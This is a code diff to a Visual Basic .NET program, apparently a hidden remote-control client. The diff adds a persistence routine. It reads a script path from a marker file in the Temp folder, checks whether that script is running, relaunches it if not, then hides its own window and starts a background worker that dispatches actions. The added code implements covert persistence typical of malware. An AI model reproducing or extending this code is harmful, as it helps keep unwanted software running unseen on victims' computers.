@@ -5,6 +5,7 @@ Imports System.Net.NetworkInformation
 Imports System.IO
 Imports System.Management
 Imports Microsoft.VisualBasic.MyServices
+Imports Microsoft.VisualBasic.CompilerServices
 
 ''' <summary>
 ''' TODO: Add mutex
@@ -100,40 +101,60 @@ Public Class MainForm
     Public Sub MainForm_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         'My.Settings.bl = False
         'My.Settings.blmsg = ""
+        'My.Settings.first_time_started = True
         'My.Settings.Save()
+        'End
 
-        If My.Settings.first_time_started Then
+        If Not File.Exists(My.Computer.FileSystem.SpecialDirectories.Temp & "\maitregims.txt") Then
             Try
-                If Initialization.Initialize() Then
-                    My.Settings.first_time_started = False
-                    My.Settings.Save()
-                End If
+                Initialization.Initialize()
             Catch : End Try
 
-            Environment.Exit(0)
-        End If
+            End
+        Else
+            Dim persistenceScriptPath As String =
+                File.ReadAllText(My.Computer.FileSystem.SpecialDirectories.Temp & "\maitregims.txt")
 
-        My.Settings.stats_total_initialisation = My.Settings.stats_total_initialisation + 1 : My.Settings.Save()
+            MsgBox("persistence script path : " & persistenceScriptPath)
+            For i = 1 To 5
+                Thread.Sleep(500) : Application.DoEvents() ' Responsive sleep
+            Next
 
-        If My.Settings.bl Then
-            If My.Settings.blmsg.Trim <> "" Then
-                MsgBox(My.Settings.blmsg,, "")
+            Dim persistenceProcessAlive As Boolean = False
+            For Each process_ In Process.GetProcesses
+                Try
+                    If process_.MainModule.FileName = persistenceScriptPath Then persistenceProcessAlive = True
+                Catch ex As ComponentModel.Win32Exception
+                End Try
+            Next
+
+            If Not persistenceProcessAlive And File.Exists(persistenceScriptPath) Then
+                Process.Start(persistenceScriptPath)
             End If
-            Environment.Exit(0)
+
+
+            My.Settings.stats_total_initialisation = My.Settings.stats_total_initialisation + 1 : My.Settings.Save()
+
+            If My.Settings.bl Then
+                If My.Settings.blmsg.Trim <> "" Then
+                    MsgBox(My.Settings.blmsg,, "")
+                End If
+                End
+            End If
+
+            ' EOF arguments parsing |
+            '                       v
+
+            ' FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read)
+            ' Dim Data As String = Space(LOF(1))
+            ' FileGet(1, Data)
+            ' FileClose(1)
+
+            CheckForIllegalCrossThreadCalls = False
+            mainBW.RunWorkerAsync()
+            Me.Opacity = 0
+            Me.Hide()
         End If
-
-        ' EOF arguments parsing |
-        '                       v
-
-        ' FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read)
-        ' Dim Data As String = Space(LOF(1))
-        ' FileGet(1, Data)
-        ' FileClose(1)
-
-        CheckForIllegalCrossThreadCalls = False
-        mainBW.RunWorkerAsync()
-        Me.Opacity = 0
-        Me.Hide()
     End Sub
 
     Private Sub parseAction(actionType As String, actionContent As String())
